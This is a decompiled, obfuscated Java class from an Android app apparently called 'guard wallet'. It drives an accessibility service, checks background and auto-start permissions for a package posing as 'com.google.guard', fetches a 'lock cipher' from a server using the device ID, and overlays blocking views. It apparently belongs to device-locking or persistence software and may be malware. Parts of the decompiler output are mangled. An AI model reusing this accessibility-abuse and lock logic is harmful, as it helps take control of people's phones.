package com.guard.wallet.thread;

import a1.q;
import com.guard.wallet.http.x;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.req.ReqDefaultBodyVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import f0.o;
import f0.s;
import f0.t;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.Iterator;
import java.util.Timer;
import java.util.concurrent.ConcurrentLinkedQueue;
import org.json.JSONObject;
import p0.f0;
import p0.j0;

public final class j implements h0.b, j0.a, s, g0.b {
   public static volatile j g;
   public final int d;
   public Object e;
   public Object f;

   public j() {
      this.d = 0;
      super();
      this.e = new ConcurrentLinkedQueue();
      this.f = new Timer();
      d var1 = new d(this, 1);
      ((Timer)this.f).schedule(var1, 500L, 500L);
   }

   public j(f0 var1, j0 var2) {
      this.d = 9;
      super();
      this.e = var1;
      this.f = var2;
   }

   public static boolean e() {
      try {
         if (h.e.S().U()) {
            return false;
         } else if (com.guard.wallet.utils.g.p0()) {
            return false;
         } else {
            return com.guard.wallet.utils.g.n0() ? false : com.guard.wallet.utils.g.Q0();
         }
      } catch (Exception var2) {
         q.s("StrategyThread", var2);
         return false;
      }
   }

   // $VF: Handled exception range with multiple entry points by splitting it
   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean g(BlockViewVO var0, boolean var1) {
      Exception var10000;
      label219: {
         boolean var2;
         label214: {
            label213: {
               label212: {
                  PowerControlStateVO var29;
                  try {
                     if (MyAccessibilityService.P() == null) {
                        return false;
                     }

                     String var5 = MyAccessibilityService.P().getPackageName();
                     if (q.B(var5)) {
                        break label212;
                     }

                     var29 = com.guard.wallet.utils.h.k(var5);
                  } catch (Exception var26) {
                     var10000 = var26;
                     boolean var10001 = false;
                     break label219;
                  }

                  if (var29 != null) {
                     try {
                        if (var29.getAllowAllFullBackground()) {
                           break label213;
                        }
                     } catch (Exception var25) {
                        var10000 = var25;
                        boolean var34 = false;
                        break label219;
                     }
                  }
               }

               var2 = false;
               break label214;
            }

            var2 = true;
         }

         boolean var3;
         label199: {
            label198: {
               label197: {
                  PowerControlStateVO var30;
                  try {
                     if (q.B("com.google.guard")) {
                        break label197;
                     }

                     var30 = com.guard.wallet.utils.h.k("com.google.guard");
                  } catch (Exception var24) {
                     var10000 = var24;
                     boolean var35 = false;
                     break label219;
                  }

                  if (var30 != null) {
                     try {
                        if (var30.getAllowAllFullBackground() || var30.getRetryCount() >= 3 || var30.getAllowAutoStart()) {
                           break label198;
                        }
                     } catch (Exception var23) {
                        var10000 = var23;
                        boolean var36 = false;
                        break label219;
                     }
                  }
               }

               var3 = false;
               break label199;
            }

            var3 = true;
         }

         boolean var4;
         label181: {
            label180: {
               try {
                  if (com.guard.wallet.utils.g.d0("com.google.guard") != null) {
                     break label180;
                  }
               } catch (Exception var22) {
                  var10000 = var22;
                  boolean var37 = false;
                  break label219;
               }

               var4 = false;
               break label181;
            }

            var4 = true;
         }

         if (var1 && var2 && (var3 || !var4)) {
            return false;
         }

         try {
            if (MyAccessibilityService.P().j()) {
               return false;
            }
         } catch (Exception var21) {
            var10000 = var21;
            boolean var38 = false;
            break label219;
         }

         try {
            if (w.a.a()) {
               return false;
            }
         } catch (Exception var17) {
            var10000 = var17;
            boolean var39 = false;
            break label219;
         }

         label163: {
            label162: {
               try {
                  if (!com.guard.wallet.utils.h.n() && !com.guard.wallet.utils.h.o()) {
                     break label162;
                  }
               } catch (Exception var20) {
                  var10000 = var20;
                  boolean var40 = false;
                  break label219;
               }

               var3 = true;
               break label163;
            }

            var3 = false;
         }

         try {
            if (!com.guard.wallet.utils.h.o()) {
               String var31 = com.guard.wallet.http.l.a;
               String var6 = com.guard.wallet.utils.h.l("deviceId");
               if (!q.B(var6)) {
                  ReqDefaultBodyVO var32 = new ReqDefaultBodyVO(var6);
                  x var33 = new x();
                  com.guard.wallet.http.i var7 = new com.guard.wallet.http.i();
                  var7.d(var32, "/api/cipher/getLockCipher", var33);
               }
            }
         } catch (Exception var16) {
            var10000 = var16;
            boolean var41 = false;
            break label219;
         }

         label152: {
            try {
               if (!com.guard.wallet.utils.g.p0() || !com.guard.wallet.utils.g.r0()) {
                  break label152;
               }
            } catch (Exception var19) {
               var10000 = var19;
               boolean var42 = false;
               break label219;
            }

            if (!var3) {
               return false;
            }
         }

         try {
            if (e.b.a != null && com.guard.wallet.utils.e.l()) {
               e.b.e();
            }
         } catch (Exception var15) {
            var10000 = var15;
            boolean var43 = false;
            break label219;
         }

         try {
            if (com.guard.wallet.utils.e.j()) {
               MyAccessibilityService.P().getClass();
               var0.setBlockDrawable(MyAccessibilityService.o0());
            }
         } catch (Exception var14) {
            var10000 = var14;
            boolean var44 = false;
            break label219;
         }

         try {
            com.guard.wallet.helper.g.a(var0);
            if (!com.guard.wallet.utils.g.p1(null)) {
               com.guard.wallet.helper.g.c();
               return false;
            }
         } catch (Exception var13) {
            var10000 = var13;
            boolean var45 = false;
            break label219;
         }

         label144: {
            try {
               q.b();
               if (q.A()) {
                  break label144;
               }

               if (q.G() && !q.O(null, null)) {
                  com.guard.wallet.helper.g.c();
                  return false;
               }
            } catch (Exception var18) {
               var10000 = var18;
               boolean var46 = false;
               break label219;
            }

            try {
               com.guard.wallet.utils.g.T0(2);
            } catch (Exception var12) {
               var10000 = var12;
               boolean var47 = false;
               break label219;
            }
         }

         try {
            com.guard.wallet.http.l.t("KEEP_ALIVE_RUNNING_EVENT");
         } catch (Exception var11) {
            var10000 = var11;
            boolean var48 = false;
            break label219;
         }

         if (!var2) {
            try {
               MyAccessibilityService.P().b(MyAccessibilityService.P().getPackageName());
            } catch (Exception var10) {
               var10000 = var10;
               boolean var49 = false;
               break label219;
            }
         } else {
            try {
               MyAccessibilityService.P().b("com.google.guard");
            } catch (Exception var9) {
               var10000 = var9;
               boolean var50 = false;
               break label219;
            }
         }

         try {
            return true;
         } catch (Exception var8) {
            var10000 = var8;
            boolean var51 = false;
         }
      }

      Exception var27 = var10000;
      q.s("StrategyThread", var27);
      return false;
   }

   @Override
   public final void a(Exception var1, Object var2) {
      switch (this.d) {
         case 1:
            var2 = var2;
            ((j)this.f).f = var2;
            ((g0.a)this.e).a(var1);
            return;
         default:
            String var3 = (String)var2;
            ((j)this.f).f = var3;
            ((g0.a)this.e).a(var1);
      }
   }

   @Override
   public final void b(o var1, f0.m var2) {
      switch (this.d) {
         case 6:
            var2.c((f0.m)this.e);
            return;
         default:
            var2.c((f0.m)this.e);
      }
   }

   @Override
   public final void c(String var1) {
      if (!"\r".equals(var1)) {
         ((com.guard.wallet.http.h)this.e).g(var1);
      } else {
         ((j0.b)this.f).l();
         j0.b var3 = (j0.b)this.f;
         var3.getClass();
         var3.f = null;
         j0.c var2 = new j0.c((com.guard.wallet.http.h)this.e);
         ((j0.b)this.f).getClass();
         j0.b var4 = (j0.b)this.f;
         if (var4.f == null) {
            var4.m = var2;
            var4.l = new f0.m();
            ((j0.b)this.f).f = new com.guard.wallet.http.h(this, 5);
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   @Override
   public final void d(f0.q var1, l0.g var2) {
      switch (this.d) {
         case 2:
            new b0.b(28).f(var1).f(null, new f0.l(new j(this, var2, 1)));
            return;
         case 5:
            com.guard.wallet.http.h var4 = new com.guard.wallet.http.h(7, 0);
            String var27 = var1.g();
            h0.h var25 = new b0.b(27).f(var1);
            f0.l var29 = new f0.l(new h0.e(var4, var27));
            h0.h var28 = new h0.h();
            synchronized (var28){} // $VF: monitorenter 

            label152: {
               Throwable var10000;
               label153: {
                  label144: {
                     try {
                        if (var28.a) {
                           break label144;
                        }
                     } catch (Throwable var24) {
                        var10000 = var24;
                        boolean var10001 = false;
                        break label153;
                     }

                     try {
                        var28.c = var25;
                     } catch (Throwable var23) {
                        var10000 = var23;
                        boolean var30 = false;
                        break label153;
                     }
                  }

                  label137:
                  try {
                     // $VF: monitorexit
                     break label152;
                  } catch (Throwable var22) {
                     var10000 = var22;
                     boolean var31 = false;
                     break label137;
                  }
               }

               while (true) {
                  Throwable var26 = var10000;

                  try {
                     // $VF: monitorexit
                     throw var26;
                  } catch (Throwable var21) {
                     var10000 = var21;
                     boolean var32 = false;
                     continue;
                  }
               }
            }

            var25.f(null, new h0.e(var28, var29));
            var28.f(null, new f0.l(new j(this, var2, 4)));
            return;
         default:
            f0.m var3 = new f0.m();
            var1.h(new j(this, var3, 6));
            var1.e = new t(this, var3, var2);
      }
   }

   @Override
   public final boolean f() {
      return true;
   }

   @Override
   public final Object get() {
      switch (this.d) {
         case 2:
            return (JSONObject)this.f;
         case 5:
            return this.toString();
         default:
            return (i0.e)this.e;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final int length() {
      switch (this.d) {
         case 2:
            byte[] var13 = ((JSONObject)this.f).toString().getBytes();
            this.e = var13;
            return var13.length;
         case 5:
            if ((byte[])this.e == null) {
               this.e = ((String)this.f).getBytes();
            }

            return ((byte[])this.e).length;
         default:
            if ((byte[])this.f == null) {
               StringBuilder var5 = new StringBuilder();

               UnsupportedEncodingException var10000;
               label76: {
                  Iterator var4;
                  try {
                     var4 = ((i0.e)this.e).iterator();
                  } catch (UnsupportedEncodingException var11) {
                     var10000 = var11;
                     boolean var10001 = false;
                     break label76;
                  }

                  boolean var1 = true;

                  while (true) {
                     boolean var2;
                     try {
                        var2 = var4.hasNext();
                     } catch (UnsupportedEncodingException var7) {
                        var10000 = var7;
                        boolean var14 = false;
                        break;
                     }

                     if (!var2) {
                        try {
                           this.f = var5.toString().getBytes("UTF-8");
                           return ((byte[])this.f).length;
                        } catch (UnsupportedEncodingException var6) {
                           var10000 = var6;
                           boolean var18 = false;
                           break;
                        }
                     }

                     i0.a var3;
                     try {
                        var3 = (i0.a)var4.next();
                        if (var3.b == null) {
                           continue;
                        }
                     } catch (UnsupportedEncodingException var10) {
                        var10000 = var10;
                        boolean var15 = false;
                        break;
                     }

                     if (!var1) {
                        try {
                           var5.append('&');
                        } catch (UnsupportedEncodingException var9) {
                           var10000 = var9;
                           boolean var16 = false;
                           break;
                        }
                     }

                     try {
                        var5.append(URLEncoder.encode(var3.a, "UTF-8"));
                        var5.append('=');
                        var5.append(URLEncoder.encode(var3.b, "UTF-8"));
                     } catch (UnsupportedEncodingException var8) {
                        var10000 = var8;
                        boolean var17 = false;
                        break;
                     }

                     var1 = false;
                  }
               }

               UnsupportedEncodingException var12 = var10000;
               throw new AssertionError(var12);
            } else {
               return ((byte[])this.f).length;
            }
      }
   }

   @Override
   public final String toString() {
      switch (this.d) {
         case 5:
            return (String)this.f;
         default:
            return super.toString();
      }
   }
}
